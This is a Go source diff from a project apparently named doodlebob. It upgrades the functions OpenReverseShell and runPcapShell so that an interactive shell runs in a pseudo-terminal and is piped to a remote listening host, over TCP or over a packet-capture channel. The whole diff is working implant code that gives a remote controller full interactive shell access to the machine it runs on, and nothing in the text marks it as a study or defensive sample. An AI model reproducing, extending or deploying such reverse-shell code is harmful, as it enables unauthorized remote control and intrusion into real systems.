@@ -15,6 +15,7 @@ import (
 	"github.com/MeHungr/doodlebob/internal/message"
 	"github.com/MeHungr/doodlebob/pkg/network"
 	"github.com/MeHungr/doodlebob/pkg/pcapconn"
+	"github.com/creack/pty"
 )
 
 // OpenReverseShell opens an OS agnostic reverse shell to a listening host
@@ -30,44 +31,71 @@ func OpenReverseShell(ip, port string) error {
 	defer conn.Close() // Close connection when function returns
 
 	cmd := exec.Command(getShell(), "-i")
-	cmd.Stdin = conn
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	cmd.Run()
-	return nil
+
+	ptmx, err := pty.Start(cmd)
+	if err != nil {
+		return fmt.Errorf("starting PTY: %w", err)
+	}
+	defer ptmx.Close()
+
+	// Connection -> PTY (stdin)
+	go func() {
+		_, _ = io.Copy(ptmx, conn)
+	}()
+
+	// PTY -> Connection (stdout + stderr)
+	_, _ = io.Copy(conn, ptmx)
+
+	return cmd.Wait()
 }
 
 // runPcapShell owns stdin copying so process exit does not wait for network EOF.
 func runPcapShell(cmd *exec.Cmd, conn net.Conn) error {
-	stdin, err := cmd.StdinPipe()
+	ptmx, err := pty.Start(cmd)
 	if err != nil {
-		return fmt.Errorf("opening shell stdin: %w", err)
+		return fmt.Errorf("starting PTY: %w", err)
 	}
-	defer stdin.Close()
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	if err := cmd.Start(); err != nil {
-		return fmt.Errorf("starting shell: %w", err)
-	}
+	defer ptmx.Close()
+
 	inputDone := make(chan struct{})
+	outputDone := make(chan struct{})
+
+	// Network -> PTY (shell input)
 	go func() {
 		defer close(inputDone)
-		defer stdin.Close()
-		_, _ = io.Copy(stdin, conn)
+		_, _ = io.Copy(ptmx, conn)
 	}()
+
+	// PTY -> Network (shell output)
+	go func() {
+		defer close(outputDone)
+		_, _ = io.Copy(conn, ptmx)
+	}()
+
+	// Wait for the shell to exit.
 	shellErr := cmd.Wait()
-	// Keep capture and injection running until the controller observes FIN and
-	// closes its side. Bound the wait if the peer does not respond.
+
+	// Close the PTY to unblock any pending reads/writes.
+	_ = ptmx.Close()
+
+	// Wait for the output forwarding goroutine to finish.
+	<-outputDone
+
+	// Signal that no more shell output will be sent.
 	if halfCloser, ok := conn.(interface{ CloseWrite() error }); ok {
 		if err := halfCloser.CloseWrite(); err != nil {
 			return fmt.Errorf("closing shell output: %w", err)
 		}
-		_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
-		select {
-		case <-inputDone:
-		case <-time.After(2 * time.Second):
-		}
 	}
+
+	// Wait briefly for the peer to finish sending input.
+	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
+
+	select {
+	case <-inputDone:
+	case <-time.After(2 * time.Second):
+	}
+
 	return shellErr
 }
 
